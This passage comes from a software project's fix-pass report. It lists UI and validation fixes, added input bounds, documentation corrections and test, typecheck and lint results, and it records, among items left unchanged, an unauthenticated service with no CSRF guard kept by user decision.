  (M13) — `clip-path`, offset paths, `object-position` and SVG geometry — with the
  `background-position` exclusion stated as the rule it is rather than left as a gap.
- **A gesture answers one pointer** (LOW), clamps against the screen as it is now rather than
  as it was at pointer-down (M12), and a press on the resize grip brings its window forward.
- **Put-away returns focus to the last thing that filled the window**, not the first (LOW).
- **A record may not redeclare what it is or hide itself from a screen reader** (`role` and
  `aria-hidden` refused), and `!important` is refused even on an on-token value.
- **The `ResizeObserver` a long-text control starts is released with the control** (M10), and
  the doorway's settle listener has a second way to end (M11) — both plain decision-13 debts.
- **Field labels take the shared `.caps` role** rather than restating its five declarations.

### Bounds that were missing

- Fields per spec (40), a string field that declares no `max_length`, and every `string[]` —
  measured across its elements, which bounds their size and their number in one number
  (M6). A capability id may not be longer than a path component allows.
- A collection larger than one statement can bind still reads: the rehydration batches, so
  the 16-bit ceiling that made a large capability *permanently unreadable* is gone.
- A rename is a compare-and-swap on the name it replaces, so two menus opened on the same
  version no longer overwrite each other in silence.
- A capability's own artifact directory goes with its last incarnation, so an ordinary
  deletion leaves nothing behind. The two that had already accumulated are removed.
- A read gate whose capability is already gone can always be retired, so `closing` is no
  longer a square with no exit.
- A name with an angle bracket in it is not a name.

### What the documents said

`docs/aluna-architecture.html` — the public page — has Module 5 in its roadmap, every
module from 5 on renumbered to match `docs/modules.md`, and no capability toolbar or modal
in its copy. `docs/modules.md`'s Module 3 and Module 4 sections carry the forward pointers
the rest of the document uses. PLAN decision 17 records the treatment the product owner
asked for and design-system.md carries the same amendment (M8), decision 1 records the
measured line count rather than the claim it made, and both "one anchor" sentences say two.
`design/README.md` lists the five files it was missing, and `bun run typecheck` clears
`.types/` so a deleted browser module cannot leave a `.d.ts` behind.

### Verified

| Check | Result |
|---|---|
| `bun run test` | **2557 passed, 0 failed** (206 files, ~330s, 2 shards) |
| `bun run typecheck` | clean |
| `bun run lint` | clean (520 files) |
| Live, on the running desk | headers served, a logo press opens its capability, the create form draws, the focus-ring split confirmed with real clicks |

The suite is sensitive to machine load, exactly as the note at the end of this document
already says. Five sharded runs were taken over the pass; the host spent most of it at load
average 15–30 for unrelated reasons, and the number of timeouts tracked that load almost
exactly — six at load 27, two at 21, one at 15, none at the load the green run above was
taken at. Every one was a `TimeoutError` on one of the slowest provider-fixture tests,
never the same pair twice, and every one passed when run alone. The same file was run
against an unmodified `HEAD` worktree and against this tree back to back at load 30: both
green. Nothing here is a regression; the machine was busy.

### What was deliberately not changed

- **C5** — unauthenticated, bound to every interface, no CSRF guard. A recorded user
  decision, unchanged. The new security headers do not alter it.
- **How many records a `read` returns** (one clause of M6). The ceiling that actually broke
  is gone; a page size is a product decision about what a collection shows, not a defect, and
  it is not one to take inside a fix pass.
